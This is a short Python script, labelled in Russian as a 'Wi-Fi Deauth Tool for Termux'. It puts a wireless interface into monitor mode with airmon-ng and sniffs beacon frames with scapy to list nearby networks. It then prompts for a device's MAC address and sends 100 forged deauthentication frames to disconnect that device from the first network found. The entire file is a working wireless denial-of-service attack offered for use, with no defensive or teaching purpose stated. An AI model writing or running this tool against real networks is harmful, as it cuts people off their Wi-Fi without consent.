import os
import time
from scapy.all import *

interface = "wlan0mon"

def setup_monitor_mode():
    os.system(f"airmon-ng start wlan0")
    print("Интерфейс переведен в режим монитора")

def scan_networks():
    networks = []
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode()
            bssid = pkt[Dot11].addr2
            if bssid not in [net['BSSID'] for net in networks]:
                networks.append({'SSID': ssid, 'BSSID': bssid})
                print(f"SSID: {ssid}, BSSID: {bssid}")
    
    print("Сканирование Wi-Fi сетей...")
    sniff(iface=interface, prn=packet_handler, timeout=10)
    return networks

def deauth_attack(target_mac, bssid):
    print(f"Атака на устройство {target_mac} в сети {bssid}...")
    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)/Dot11Deauth()
    sendp(pkt, iface=interface, count=100, inter=.1)

def main():
    print("Wi-Fi Deauth Tool для Termux")
    
    # Настройка интерфейса
    setup_monitor_mode()

    # Сканирование сетей
    networks = scan_networks()

    # Выбор сети и устройства
    if len(networks) == 0:
        print("Не найдено доступных сетей.")
        return

    selected_network = networks[0]  # Выбираем первую сеть для примера
    print(f"Выбрана сеть: SSID: {selected_network['SSID']}, BSSID: {selected_network['BSSID']}")

    target_mac = input("Введите MAC адрес устройства для атаки: ")

    # Выполнение deauth-атаки
    deauth_attack(target_mac, selected_network['BSSID'])

if __name__ == "__main__":
    main()
